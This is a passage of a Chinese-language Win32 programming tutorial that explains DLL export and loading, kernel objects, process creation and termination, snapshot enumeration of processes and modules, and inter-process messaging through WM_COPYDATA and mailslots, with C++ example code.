class="line"><span class="comment">//</span></span><br><span class="line"><span class="function">BOOL APIENTRY <span class="title">DllMain</span><span class="params">( HMODULE hModule, DWORD  ul_reason_for_call,LPVOID lpReserved)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">switch</span> (ul_reason_for_call)</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">case</span> DLL_PROCESS_ATTACH:  <span class="comment">//进程加载</span></span><br><span class="line">    <span class="keyword">case</span> DLL_THREAD_ATTACH:  <span class="comment">//线程加载</span></span><br><span class="line">    <span class="keyword">case</span> DLL_THREAD_DETACH:  <span class="comment">//线程卸载</span></span><br><span class="line">    <span class="keyword">case</span> DLL_PROCESS_DETACH:  <span class="comment">//进程卸载</span></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="声明导出"><a href="#声明导出" class="headerlink" title="声明导出"></a>声明导出</h2><p>在需要导出函数的头文件中声明</p><p>extern “C” _declspec(dllexport) <strong>void pr();</strong>//需要声明的函数即返回类型</p><p>注意一定要在cpp文件中包含头文件，不然找不到该函数的定义</p><h2 id="模块定义文件导出"><a href="#模块定义文件导出" class="headerlink" title="模块定义文件导出"></a>模块定义文件导出</h2><p>添加一个.def文件 ，</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">EXPORTS</span><br><span class="line">Fun1 @<span class="number">1</span></span><br><span class="line">Fun2 @<span class="number">2</span></span><br></pre></td></tr></table></figure><p>Fun1和Fun2是函数名，@1表示导出函数的序号</p><p>在属性配置里–&gt;连接器–&gt;输入，中有一个模块定义文件，把这个选项值写成.def文件全称（xxx.def）</p><p>调用dll中函数的方式，有两种：</p><h2 id="隐式调用"><a href="#隐式调用" class="headerlink" title="隐式调用"></a>隐式调用</h2><p> 包含头文件，头文件中含有导出函数的声明。<br>​ 载入lib文件 #pragma comment（lib,“”）;<br>​ 直接调用函数即可</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;..\Dll1\Dll1.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib,<span class="string">&quot;..\\Debug\\Dll1.lib&quot;</span>)</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">fun1</span>();</span><br><span class="line">    <span class="built_in">fun2</span>();</span><br><span class="line">    <span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="显示调用"><a href="#显示调用" class="headerlink" title="显示调用"></a>显示调用</h2><p>使用显示调用不需要头文件，但是你需要知道函数的原型（返回值类型，各个参数的类型）。<br>LoadLibrary（）将目标dll强行加载到本进程中。<br>GetProcAddress()获得函数的地址。<br>自然就可以调用此函数。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">typedef</span>  <span class="title">void</span><span class="params">(*FUN)</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line">FUN g_Fun;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    HMODULE hModule =  <span class="built_in">LoadLibrary</span>(<span class="string">L&quot;Dll1.dll&quot;</span>);</span><br><span class="line">    g_Fun =  (FUN)<span class="built_in">GetProcAddress</span>(hModule, <span class="string">&quot;fun1&quot;</span>);</span><br><span class="line"><span class="built_in">g_Fun</span>();</span><br><span class="line">    <span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="ib文件的差别："><a href="#ib文件的差别：" class="headerlink" title="ib文件的差别："></a>ib文件的差别：</h2><p>随着dll一起生成的lib文件，称之为导入库，里面是没有代码和数据，是链接信息，供编译器再exe文件与dll文件做链接的。<br>还有一种是静态对象库，编译的时候会将静态库中的使用到的代码数据编译到exe中，exe发布就不需要携带很多文件。</p><h1 id="七、进程"><a href="#七、进程" class="headerlink" title="七、进程"></a>七、进程</h1><p>1 内核对象的概念</p><p>2 进程，模块，线程</p><p>概念</p><p>基本操作：</p><p>进程 模块 线程的遍历</p><p>进程的终止 强制结束 进程间的通讯</p><p>线程挂起 恢复 终止 强制结束</p><p>3 文件操作</p><p>难点：递归遍历文件</p><p>4 线程同步：原子操作 临界区 互斥体 事件 信号量</p><p>5 同步IO和异步IO</p><p>6 基本的网络编程 TCP UDP</p><p>7 IOCP模型</p><h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><p>一、 如何理解内核对象的概念？</p><p>a. windows操作系统的设计是面向对象的，很多的组件都是以对象的方式去管理的。将整个操作系统的内核看成是一个封装体，API函数就是对外的接口。然后通过给API传递句柄去实现操作具体的某一个对象，句柄就是对象的标识。windows管理的对象也有很多类型，不同类型的对象的管理方式是不同的。</p><p>b. 所有的API函数都是隶属于不同的动态链接库（DLL文件）的。有三大DLL文件：</p><p>User32.dll GDI32.dll kernel32.dll</p><p>其中User32.dll和窗口，控件等有关，GDI32和绘制图形有关，Kernel32和操作系统的界面无关的很多机制有关。</p><p>这三种DLL创建出来的对象就可以分为3大类。管理方式就不一样。那么我们的内核对象有自己的管理方式。</p><p>c. 一个进程，是一个运行中的程序。</p><p>一个进程包含了一个运行中的程序所用到的所有资源：一个内存空间 内存空间中有很多的模块 内存空间被分成了两大部分—用户层和内核层</p><p>我们正常的普通程序只能访问用户层空间（00000000<del>7FFFFFFF）。大部分的对象（结构体变量）都是放在内核空间的（80000000</del>FFFFFFFF）。</p><p>所以我们自然不能直接访问到对象，而是通过句柄。</p><p>所有的进程内核层是共享的，不同的进程用户层空间是不一样。</p><p>2 内核对象有什么特点？？</p><p>特点1—内核对象是跨进程的：所有的内核对象存在于内核层的。既然内核层是大家共享的，所以内核对象也是可以跨进程的。</p><p>特点2—跨进程机制怎么管理呢？？：通过引用计数和内核对象句柄表管理的。</p><p>进程A的句柄表</p><div class="table-container"><table><thead><tr><th>1</th><th>内核对象A的地址</th><th></th></tr></thead><tbody><tr><td>2</td><td>内核对象B的地址</td></tr></tbody></table></div><p>进程B的句柄表</p><div class="table-container"><table><thead><tr><th>1</th><th>内核对象B的地址</th><th></th></tr></thead><tbody><tr><td></td><td></td></tr></tbody></table></div><p>进程C的句柄表</p><div class="table-container"><table><thead><tr><th>1</th><th>内核对象M的地址</th><th></th></tr></thead><tbody><tr><td>2</td><td>内核对象N的地址</td><td></td></tr><tr><td>3</td><td>内核对象L的地址</td></tr></tbody></table></div><div class="table-container"><table><thead><tr><th>4</th><th>内核对象B的地址</th><th></th></tr></thead><tbody><tr><td></td><td></td></tr></tbody></table></div><p>如果一个内核对象被n个进程使用，引用计数就是n。没有被进程使用，引用计数就是0，没被任何进程使用，内核对象就会自动销毁。</p><p>特点3：每一个内核对象都有安全描述属性，我们通过创建对象的API是否包含这样一个参数，就能确定它是不是内核对象</p><p>3 通过我们怎么获得内核对象的句柄的</p><p>a. 自己创建的</p><p>b. 自己打开的（这个对象是已经创建好的）</p><p>c. 从父进程继承过来的。</p><p>d. 别的进程复制过来的。DuplicateHandle</p><h3 id="进程概念："><a href="#进程概念：" class="headerlink" title="进程概念："></a>进程概念：</h3><p>进程，简单来说，就是一个运行中的程序，包含了：</p><p>a. 一个虚拟的内存空间 所有程序的代码和数据都在这片内存空间中。</p><p>b. 内存空间中排布了很多的模块</p><p>c. 至少有一个线程</p><p>在进程的虚拟内存中，一般会加载一个exe，很多的dll。他们都称之为模块。</p><p>进程本身是一个综合了各种资源的东西，是不能执行代码，能够执行代码的是归属于进程的线程。</p><p>每一个线程都是一个独立的执行单元：</p><p>1 每一个线程有自己的一块堆栈。</p><p>2 每一个线程有自己的执行环境。</p><p>CPU在执行代码的时候，主要是依赖于一套寄存器：</p><p>通用寄存器：eax ebx ecx edx esi edi esp ebp</p><p>指令指针寄存器：eip 存储着下一条要执行的指令</p><p>段寄存器：cs ss ds es fs gs</p><p>…..</p><p>所有的线程都是操作系统统一去管理调度的，每一个线程都有自己的优先级。根据优先级决定先调用谁后调用谁。</p><p>线程发生切换，实际就是切换线程的执行环境，比如现在有A，B，C三个线程，此时线程A在执行，线程A的时间片用完了，就保存A的执行环境，看B和C的优先级谁高，假如是C高，那么就把C的线程环境加载到CPU中。</p><h2 id="基本操作："><a href="#基本操作：" class="headerlink" title="基本操作："></a>基本操作：</h2><p>进程 模块 线程的遍历（非常重要的操作）</p><p>方法有很多 我们这里使用的是创建快照的方式：CreateToolHelp32Snapshot。</p><p>需要知道的几点：</p><p>a. 进程是操作系统管理的，遍历的时候，能够遍历出系统中的所有进程的信息：进程名，路径，进程ID</p><p> 遍历进程的用处：通常来说我们都是知道进程名，然后去找到ID（ID每一次程序运行的时候都是不一样的），我们如果要操作进程，就需要使用OpenProcess函数得到它的句柄，OpenProcess这个函数，就是根据进程ID得到句柄的。</p><p>b. 模块是属于某一个进程的，所以我们遍历模块的时候，需要指定遍历的是哪一个进程的模块。</p><p> 能够遍历出模块的信息为：模块名，模块的起始虚拟地址（加载基址）</p><p> 遍历模块的用处：a 可以知道一个程序都加载了哪些DLL，监测DLL注入 b 分析DLL中的PE文件信息，可以为我们分析一个程序提供依据。</p><p>c. 线程虽然也是属于某一个进程的，但是其管理是操作系统统一管理的，所以我们遍历的时候，也是遍历出操作系统中的所有线程。需要自己去过滤然后，得到某一个进程的线程。</p><p> 线程遍历，能够得到的信息有：线程ID，所属进程的ID。</p><p> 遍历线程的用处：可以得到进程中每一个线程的信息。可以操作这些线程，比如挂起，终止等等。</p><h2 id="进程控制"><a href="#进程控制" class="headerlink" title="进程控制"></a>进程控制</h2><div class="table-container"><table><thead><tr><th>WinExec</th><th>可以创建进程</th></tr></thead><tbody><tr><td>ShellExecute</td><td>可以创建一个进程，打印一个文件，浏览一个文件夹</td></tr><tr><td>system</td><td>也能够以控制台命令的方式打开一个进程</td></tr><tr><td>CreateProcess</td><td>创建进程</td></tr><tr><td>OpenProcess</td><td>打开进程</td></tr><tr><td>ExitProcess</td><td>退出本进程</td></tr><tr><td>TerminateProcess</td><td>结束其它进程</td></tr></tbody></table></div><h3 id="进程的创建"><a href="#进程的创建" class="headerlink" title="进程的创建"></a>进程的创建</h3><p>1使用宏加载想要的进程#define PATH2 L”D:\Program Files (x86)\Tencent\QQ\Bin\QQScLauncher.exe”</p><p>2使用结构体PROCESS_INFORMATION定义加载进程信息的缓冲区</p><p>3使用CreateProcess函数创建进程</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PATH2 <span class="string">L&quot;D:\\Program Files (x86)\\Tencent\\QQ\\Bin\\QQScLauncher.exe&quot;</span></span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">STARTUPINFO si = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">PROCESS_INFORMATION pi = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="built_in">CreateProcess</span>(</span><br><span class="line">PATH2,   <span class="comment">//路径</span></span><br><span class="line"><span class="literal">NULL</span>,   <span class="comment">//命令行参数</span></span><br><span class="line"><span class="literal">NULL</span>,   <span class="comment">//进程安全属性</span></span><br><span class="line"><span class="literal">NULL</span>,   <span class="comment">//线程安全属性</span></span><br><span class="line">FALSE,  <span class="comment">//是否继承句柄</span></span><br><span class="line"><span class="literal">NULL</span>,    <span class="comment">//创建方式</span></span><br><span class="line"><span class="literal">NULL</span>,    <span class="comment">//环境</span></span><br><span class="line"><span class="literal">NULL</span>,    <span class="comment">//当前的运行目录</span></span><br><span class="line">&amp;si,     <span class="comment">//启动信息</span></span><br><span class="line">&amp;pi      <span class="comment">//进程信息</span></span><br><span class="line">);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="结束一个进程"><a href="#结束一个进程" class="headerlink" title="结束一个进程"></a>结束一个进程</h3><p>使用该进程PID打开进程从而获取到进程句柄</p><p>使用TerminateProcess函数结束进程</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//1. 打开进程，得到句柄</span></span><br><span class="line">HANDLE hProcess = <span class="built_in">OpenProcess</span>(PROCESS_TERMINATE, FALSE, <span class="number">5312</span>);</span><br><span class="line"><span class="comment">//2. 终结进程</span></span><br><span class="line"><span class="built_in">TerminateProcess</span>(hProcess, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="进程与模块"><a href="#进程与模块" class="headerlink" title="进程与模块"></a>进程与模块</h2><div class="table-container"><table><thead><tr><th>CreateToolhelp32Snapshot</th><th>可以分别创建进程，线程，进程模块进程堆的快照</th></tr></thead><tbody><tr><td>Process32First</td><td>用来首次调用，获得第一个进程信息</td></tr><tr><td>Process32Next</td><td>以后的调用由它来完成，不断的获取进程信息</td></tr><tr><td>Module32First</td><td>用来首次调用，获得第一个模块信息</td></tr><tr><td>Module32Next</td><td>以后的调用由它来完成，不断的获取模块信息</td></tr><tr><td>Thread32First</td><td>用来首次调用，获得第一个线程信息</td></tr><tr><td>Thread32Next</td><td>以后的调用由它来完成，不断地获取线程信息</td></tr></tbody></table></div><p>创建快照</p><p>WIndows提供了一组快照的API，使用前需要包含TIHelp32.h头文件，这一组API</p><p> 能够给当前系统中所有进程拍一个快照，能够获取所有进程的一些基本信息</p><p> 能够当前系统中的线程拍一个快照</p><p> 能够给某一个进程拍模块快照</p><p> 能够给某一个进程拍堆快照</p><h3 id="进程的遍历"><a href="#进程的遍历" class="headerlink" title="进程的遍历"></a>进程的遍历</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;TlHelp32.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//1. 得到快照的句柄</span></span><br><span class="line">HANDLE hToolHelp =  <span class="built_in">CreateToolhelp32Snapshot</span>(</span><br><span class="line">TH32CS_SNAPPROCESS,</span><br><span class="line"><span class="number">0</span></span><br><span class="line">);</span><br><span class="line"><span class="comment">//2. 获取第一个结点的信息</span></span><br><span class="line">PROCESSENTRY32 pe = &#123;<span class="built_in">sizeof</span>(PROCESSENTRY32)&#125;;</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">Process32First</span>(hToolHelp, &amp;pe))</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//pe.szExeFile;//进程名</span></span><br><span class="line"><span class="comment">//pe.th32ProcessID;//ID</span></span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d:%S\n&quot;</span>, pe.th32ProcessID, pe.szExeFile);</span><br><span class="line">&#125; <span class="keyword">while</span> (<span class="built_in">Process32Next</span>(hToolHelp, &amp;pe));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="模块的遍历"><a href="#模块的遍历" class="headerlink" title="模块的遍历"></a>模块的遍历</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;TlHelp32.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//1. 得到快照的句柄</span></span><br><span class="line">HANDLE hToolHelp = <span class="built_in">CreateToolhelp32Snapshot</span>(</span><br><span class="line">TH32CS_SNAPMODULE,</span><br><span class="line"><span class="number">25076</span></span><br><span class="line">);</span><br><span class="line"><span class="comment">//2. 获取第一个结点的信息</span></span><br><span class="line">MODULEENTRY32 me = &#123; <span class="built_in">sizeof</span>(MODULEENTRY32) &#125;;</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">Module32First</span>(hToolHelp, &amp;me))</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//pe.szExeFile;//进程名</span></span><br><span class="line"><span class="comment">//pe.th32ProcessID;//ID</span></span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;模块名：%S  加载基址：%p\n&quot;</span>, me.szModule, me.modBaseAddr);</span><br><span class="line">&#125; <span class="keyword">while</span> (<span class="built_in">Module32Next</span>(hToolHelp, &amp;me));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="进程间通讯"><a href="#进程间通讯" class="headerlink" title="进程间通讯"></a>进程间通讯</h2><h3 id="发送消息"><a href="#发送消息" class="headerlink" title="发送消息"></a>发送消息</h3><p>COPYDATASTRUCT发送</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">HWND hWnd = (HWND)<span class="number">0x0003037E</span>;</span><br><span class="line"></span><br><span class="line">COPYDATASTRUCT cds = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="type">char</span> buf[<span class="number">100</span>] = &#123; <span class="string">&quot;hahahahahahahahlou  world&quot;</span> &#125;;</span><br><span class="line"></span><br><span class="line">cds.dwData = <span class="number">200</span>;<span class="comment">//随便写，写什么发什么</span></span><br><span class="line">cds.lpData = buf;</span><br><span class="line">cds.cbData = <span class="number">100</span>;</span><br><span class="line"><span class="built_in">SendMessage</span>(hWnd, WM_COPYDATA, <span class="number">0</span>, (LPARAM)&amp;cds);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>邮槽发送</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">// 1. 打开邮槽对象</span></span><br><span class="line">HANDLE hFile = <span class="built_in">CreateFile</span>(</span><br><span class="line"><span class="string">L&quot;\\\\.\\mailslot\\Sample&quot;</span>, <span class="comment">// 邮槽名称</span></span><br><span class="line">GENERIC_WRITE,              <span class="comment">// 读写属性</span></span><br><span class="line">FILE_SHARE_READ,            <span class="comment">// 共享属性</span></span><br><span class="line"><span class="literal">NULL</span>,                       <span class="comment">// 安全属性</span></span><br><span class="line">OPEN_EXISTING,              <span class="comment">// 打开方式</span></span><br><span class="line">FILE_ATTRIBUTE_NORMAL,      <span class="comment">// 标志位</span></span><br><span class="line"><span class="literal">NULL</span>);                      <span class="comment">// 文件模板（默认留空）</span></span><br><span class="line"><span class="comment">// 2. 向mailslot写入</span></span><br><span class="line">DWORD  dwWritten;</span><br><span class="line">LPSTR  lpMessage = (LPSTR)<span class="string">&quot;邮槽测试消息！&quot;</span>;</span><br><span class="line">DWORD  dwMegLen = <span class="built_in">strlen</span>(lpMessage) + <span class="built_in">sizeof</span>(CHAR);</span><br><span class="line"><span class="built_in">WriteFile</span>(hFile, lpMessage, dwMegLen, &amp;dwWritten, <span class="literal">NULL</span>);</span><br><span class="line"><span class="comment">// 3. 结束</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;已经向邮槽写入信息！\n&quot;</span>);</span><br><span class="line"><span class="built_in">CloseHandle</span>(hFile);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="接收消息"><a href="#接收消息" class="headerlink" title="接收消息"></a>接收消息</h3><p>COPYDATA接收只需在回调函数的WM_COPYDATA消息响应定义接收的结构体</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> WM_COPYDATA:</span><br><span class="line">&#123;</span><br><span class="line">PCOPYDATASTRUCT pcds = (PCOPYDATASTRUCT)lParam;</span><br><span class="line"><span class="built_in">MessageBoxA</span>(<span class="number">0</span>, (<span class="type">char</span>*)(pcds-&gt;lpData), <span class="string">&quot;提示&quot;</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">break</span>;</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">// 1. 创建邮槽对象</span></span><br><span class="line">HANDLE hSlot = <span class="built_in">CreateMailslot</span>(</span><br><span class="line"><span class="string">L&quot;\\\\.\\mailslot\\Sample&quot;</span>,    <span class="comment">// 邮槽名</span></span><br><span class="line"><span class="number">0</span>,         <span class="comment">// 不限制消息大小 </span></span><br><span class="line">MAILSLOT_WAIT_FOREVER,         <span class="comment">// 无超时 </span></span><br><span class="line">(LPSECURITY_ATTRIBUTES)<span class="literal">NULL</span>    <span class="comment">// 安全属性</span></span><br><span class="line">); </span><br><span class="line"><span class="comment">// 2. 循环读取邮槽信息</span></span><br><span class="line"><span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line"><span class="comment">// 2.1 获取邮槽消息数量</span></span><br><span class="line">DWORD dwMsgCount = <span class="number">0</span>, dwMsgSize = <span class="number">0</span>;</span><br><span class="line"><span class="built_in">GetMailslotInfo</span>(     <span class="comment">/* 获取邮槽信息 */</span></span><br><span class="line">hSlot,           <span class="comment">// 邮槽句柄 </span></span><br><span class="line">(LPDWORD)<span class="literal">NULL</span>,<span class="comment">// 无最大消息限制</span></span><br><span class="line">&amp;dwMsgSize,      <span class="comment">// 下一条消息的大小</span></span><br><span class="line">&amp;dwMsgCount,     <span class="comment">// 消息的数量</span></span><br><span class="line">(LPDWORD)<span class="literal">NULL</span>);<span class="comment">// 无时限</span></span><br><span class="line"><span class="keyword">if</span> (dwMsgSize == MAILSLOT_NO_MESSAGE) &#123;</span><br><span class="line"><span class="built_in">Sleep</span>(<span class="number">2000</span>);</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 2.2 循环获取全部消息（有可能不只一条）</span></span><br><span class="line"><span class="comment">// 2.2 循环获取全部消息（有可能不只一条）</span></span><br><span class="line"><span class="keyword">while</span> (dwMsgCount)</span><br><span class="line">&#123;</span><br><span class="line">PBYTE lpBuffer;</span><br><span class="line">lpBuffer = <span class="keyword">new</span> BYTE[dwMsgSize + <span class="number">0x10</span>];</span><br><span class="line"><span class="comment">// 读取邮槽中的信息</span></span><br><span class="line">DWORD dwRet;</span><br><span class="line"><span class="built_in">ZeroMemory</span>(lpBuffer, dwMsgSize);</span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">ReadFile</span>(hSlot, lpBuffer, dwMsgSize, &amp;dwRet, <span class="literal">NULL</span>))</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;ReadFile函数执行失败，错误码：%d.\n&quot;</span>, <span 